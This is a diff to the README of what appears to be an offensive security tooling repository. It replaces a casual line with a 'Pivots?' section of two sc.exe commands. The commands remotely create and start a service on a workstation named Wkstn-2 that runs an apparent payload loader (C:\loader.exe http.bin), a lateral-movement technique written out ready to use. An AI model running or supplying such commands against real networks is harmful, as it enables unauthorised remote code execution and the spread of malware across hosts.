@@ -1,4 +1,10 @@
 # CS-Tooling
 Random tools that i wrote/found.
 
-i have different typa things, i need work on powershell one doe
+Pivots?:
+
+```
+sc.exe \\Wkstn-2 create piv1 displayname=piv1 binpath="C:\loader.exe http.bin" start=demand
+
+sc.exe \\Wkstn-2 start piv1
+```
